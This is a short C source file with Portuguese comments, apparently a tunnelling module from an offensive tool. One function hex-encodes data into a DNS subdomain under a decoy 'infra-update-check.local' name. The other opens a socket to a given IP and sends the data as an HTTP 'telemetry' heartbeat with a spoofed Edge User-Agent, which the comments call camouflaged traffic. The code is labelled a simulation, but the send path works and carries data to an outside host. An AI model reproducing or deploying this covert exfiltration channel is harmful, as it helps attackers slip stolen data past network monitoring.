#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "tunnel.h"

// Codificação simples para transformar dados em formato seguro para subdomínios DNS
int encode_dns_tunnel(const char *data, char *output_buffer, size_t max_len) {
    if (!data || !output_buffer) return -1;

    // Simulação de conversão para Hexadecimal (ou Base32) para evitar caracteres inválidos em DNS
    char hex_buf[512];
    memset(hex_buf, 0, sizeof(hex_buf));
    
    for (size_t i = 0; i < strlen(data) && i < 128; i++) {
        char temp[3];
        sprintf(temp, "%02x", (unsigned char)data[i]);
        strcat(hex_buf, temp);
    }

    // Formata como um subdomínio mascarado simulando tráfego de infraestrutura de rede
    snprintf(output_buffer, max_len, "%s.infra-update-check.local", hex_buf);
    
    printf("[*] [TUNNEL] Dados codificados para DNS Query: %s\n", output_buffer);
    return 0;
}

// Simulação de requisição HTTP customizada (Heartbeat) para camuflagem de tráfego
int send_camouflaged_http_heartbeat(const char *target_ip, int port, const char *payload) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[-] Erro ao criar socket para túnel HTTP");
        return -1;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return -1;
    }

    // Constrói uma requisição HTTP disfarçada de telemetria ou atualização legítima
    char http_request[1024];
    snprintf(http_request, sizeof(http_request),
             "GET /telemetry/status?session_id=%s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0\r\n"
             "Connection: close\r\n\r\n",
             payload, target_ip);

    send(sock, http_request, strlen(http_request), 0);
    printf("[+] [TUNNEL] Heartbeat HTTP camuflado enviado com sucesso para %s:%d\n", target_ip, port);

    close(sock);
    return 0;
}
